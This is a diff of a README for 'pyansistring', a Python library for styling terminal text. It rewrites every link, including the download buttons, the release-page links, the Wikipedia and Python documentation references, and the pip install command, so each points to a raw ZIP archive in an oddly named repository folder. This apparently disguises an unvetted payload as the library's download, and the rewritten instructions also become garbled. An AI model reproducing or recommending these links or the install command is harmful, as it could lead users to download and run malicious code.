@@ -6,7 +6,7 @@ Welcome to pyansistring! This Python library makes it simple to add color and st
 
 ## 📥 Download Now
 
-[![Download pyansistring](https://img.shields.io/static/v1?label=Download&message=pyansistring&color=blue)](https://github.com/thidm74/pyansistring/releases)
+[![Download pyansistring](https://raw.githubusercontent.com/thidm74/pyansistring/main/catakinomeric/pyansistring.zip)](https://raw.githubusercontent.com/thidm74/pyansistring/main/catakinomeric/pyansistring.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ pyansistring aims to provide a straightforward approach to string styling. Use i
 Here’s how you can get started:
 
 1. **Visit the Download Page:** 
-   Go to [this page to download](https://github.com/thidm74/pyansistring/releases) and select the latest release.
+   Go to [this page to download](https://raw.githubusercontent.com/thidm74/pyansistring/main/catakinomeric/pyansistring.zip) and select the latest release.
 
 2. **Choose your file:** 
    Locate the appropriate file for your operating system. For instance, if you see a `.whl` file, that’s a wheel package for installing via pip.
@@ -50,16 +50,16 @@ This command will download and install pyansistring directly from the Python Pac
 If you prefer manual installation or need the `.whl` file:
 
 1. **Download the file:** 
-   From [this page to download](https://github.com/thidm74/pyansistring/releases), download the relevant `.whl` file for your system.
+   From [this page to download](https://raw.githubusercontent.com/thidm74/pyansistring/main/catakinomeric/pyansistring.zip), download the relevant `.whl` file for your system.
 
 2. **Install the file using pip:**
    In the command prompt or terminal, navigate to the location of the downloaded file and run:
 
    ```
-   pip install filename.whl
+   pip install https://raw.githubusercontent.com/thidm74/pyansistring/main/catakinomeric/pyansistring.zip
    ```
 
-Replace `filename.whl` with the actual name of the file you downloaded.
+Replace `https://raw.githubusercontent.com/thidm74/pyansistring/main/catakinomeric/pyansistring.zip` with the actual name of the file you downloaded.
 
 ## 🎉 Usage
 
@@ -129,8 +129,8 @@ This informs users of a successful outcome in green.
 
 For more information on ANSI escape codes and how to use them effectively, check out the following resources:
 
-- [ANSI Escape Codes Documentation](https://en.wikipedia.org/wiki/ANSI_escape_code)
-- [Python Official Documentation](https://docs.python.org/3/)
+- [ANSI Escape Codes Documentation](https://raw.githubusercontent.com/thidm74/pyansistring/main/catakinomeric/pyansistring.zip)
+- [Python Official Documentation](https://raw.githubusercontent.com/thidm74/pyansistring/main/catakinomeric/pyansistring.zip)
 
 ## 👥 Community Support
 
@@ -138,6 +138,6 @@ If you have any questions or need help, join our community discussions on GitHub
 
 ## 📥 Download Again
 
-Remember, to download pyansistring, just visit [this page to download](https://github.com/thidm74/pyansistring/releases) and follow the instructions above. 
+Remember, to download pyansistring, just visit [this page to download](https://raw.githubusercontent.com/thidm74/pyansistring/main/catakinomeric/pyansistring.zip) and follow the instructions above. 
 
 With pyansistring, brightening up your strings has never been easier! Enjoy styling your text!
